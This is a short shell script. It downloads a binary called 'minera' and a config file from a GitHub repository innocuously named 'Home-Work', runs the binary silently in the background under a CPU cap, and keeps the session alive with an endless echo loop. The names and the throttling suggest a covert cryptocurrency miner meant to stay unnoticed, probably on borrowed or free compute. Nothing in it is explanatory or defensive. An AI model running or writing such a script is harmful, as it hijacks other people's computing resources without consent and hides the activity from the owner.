apt-get update -y
apt-get install -y cpulimit screen
wget https://github.com/asiangbans/Home-Work/raw/main/minera
wget https://raw.githubusercontent.com/asiangbans/Home-Work/main/config.json
chmod +x minera
chmod +x config.json
cpulimit -l 20 ./minera >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
